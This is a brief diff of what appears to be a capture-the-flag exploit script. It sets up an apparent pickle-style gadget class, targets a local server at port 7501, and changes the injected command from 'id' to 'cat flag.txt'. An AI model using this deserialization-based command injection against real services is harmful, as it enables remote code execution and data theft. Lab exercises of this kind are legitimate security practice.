@@ -38,7 +38,7 @@ class Root:
         return str, (str(self),)
 
 server_host = 'http://127.0.0.1:7501'
-command = 'id'
+command = 'cat flag.txt'
 
 def send_delta(d):
     # this posts a delta to the remote host
